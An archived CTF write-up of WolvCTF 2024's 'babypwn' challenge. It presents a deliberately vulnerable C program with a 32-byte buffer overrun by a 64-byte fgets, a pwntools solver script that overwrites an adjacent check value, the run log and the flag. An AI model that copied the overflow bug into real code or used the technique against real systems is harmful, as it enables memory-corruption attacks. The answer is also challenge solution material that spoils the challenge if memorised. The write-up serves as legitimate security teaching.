# babypwn

**CTF:** WolvCTF 2024  
**Category:** pwn  
**Original writeup:** <https://nopedawn.github.io/posts/ctfs/2024/wolv-ctf-2024/> — by **nopedawn**. All credit goes to the original author; this is an archived copy.

---

Overview Author: iqlusion

Description: Just a little baby pwn.

Connection: nc babypwn.wolvctf.io 1337 babypwn

babypwn.c

Given two attachments of this challenge babypwn & babypwn.c , is a baby bof (buffer overflow) vulnerability.

determine file type & check binary elf protection $ file babypwn babypwn: ELF 64-bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped $ checksec babypwn [ * ] '/home/nopedawn/CCUG/WolvCTF24/babypwn/babypwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 )

babypwn.c 1 #include <stdio.h> 2 #include <string.h> 3 #include <unistd.h> 4 5 struct __attribute__ (( __packed__ )) data { 6 char buff [ 32 ]; 7 int check ; 8 }; 9 10 void ignore ( void ) 11 { 12 setvbuf ( stdout , NULL , _IONBF , 0 ); 13 setvbuf ( stdin , NULL , _IONBF , 0 ); 14 } 15 16 void get_flag ( void ) 17 { 18 char flag [ 1024 ] = { 0 }; 19 FILE * fp = fopen ( "flag.txt" , "r" ); 20 fgets ( flag , 1023 , fp ); 21 printf ( flag ); 22 } 23 24 int main ( void ) 25 { 26 struct data name ; 27 ignore (); /* ignore this function */ 28 29 printf ( "What's your name?

" ); 30 fgets ( name . buff , 64 , stdin ); 31 sleep ( 2 ); 32 printf ( "%s nice to meet you!

" , name . buff ); 33 sleep ( 2 ); 34 printf ( "Binary exploitation is the best!

" ); 35 sleep ( 2 ); 36 printf ( "Memory unsafe languages rely on coders to not make mistakes.

" ); 37 sleep ( 2 ); 38 printf ( "But I don't worry, I write perfect code :)

" ); 39 sleep ( 2 ); 40 41 if ( name . check == 0x41414141 ) { 42 get_flag (); 43 } 44 45 return 0 ; 46 }

The fgets function in the main function reads 64 bytes into name.buff , which is only 32 bytes long. This can lead to an overflow of the check variable if more than 32 bytes are entered.

To exploit this, we need to enter 32 bytes to fill up the buff array, and then 4 more bytes to overwrite the check variable with the value 0x41414141 . Here’s an solver:

solver.py 1 from pwn import * 2 3 def exploit ( io ): 4 io . recvuntil ( b "What's your name?" ) 5 6 payload = b 'A' * 32 7 payload += p32 ( 0x41414141 ) 8 io . sendline ( payload ) 9 10 # output = io.recvall() 11 # print(output) 12 io . interactive () 13 14 if __name__ == "__main__" : 15 context . update ( log_level = 'debug' ) 16 try : 17 io = remote ( 'babypwn.wolvctf.io' , 1337 ) 18 exploit ( io ) 19 except : 20 io = process ( './babypwn' ) 21 exploit ( io )

running $ python3 solver.py [ + ] Opening connection to babypwn.wolvctf.io on port 1337: Done [ DEBUG ] Received 0x1e bytes: b '== proof-of-work: disabled ==

' [ DEBUG ] Received 0x12 bytes: b "What's your name?

" [ DEBUG ] Sent 0x25 bytes: b 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

' [ * ] Switching to interactive mode [ DEBUG ] Received 0x38 bytes: b 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

' b ' nice to meet you!

' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA nice to meet you! [ DEBUG ] Received 0x21 bytes: b 'Binary exploitation is the best!

' Binary exploitation is the best! [ DEBUG ] Received 0x3d bytes: b 'Memory unsafe languages rely on coders to not make mistakes.

' Memory unsafe languages rely on coders to not make mistakes. [ DEBUG ] Received 0x2b bytes: b "But I don't worry, I write perfect code :)

" But I don 't worry, I write perfect code :) [DEBUG] Received 0x20 bytes: b' wctf { pwn_1s_th3_best_Categ0ry! }

' wctf{pwn_1s_th3_best_Categ0ry!} [*] Got EOF while reading in interactive $ q [DEBUG] Sent 0x2 bytes: b' q

' $ q [DEBUG] Sent 0x2 bytes: b' q

' [ * ] Closed connection to babypwn.wolvctf.io port 1337 [ * ] Got EOF while sending in interactive

FLAG wctf{pwn_1s_th3_best_Categ0ry!}
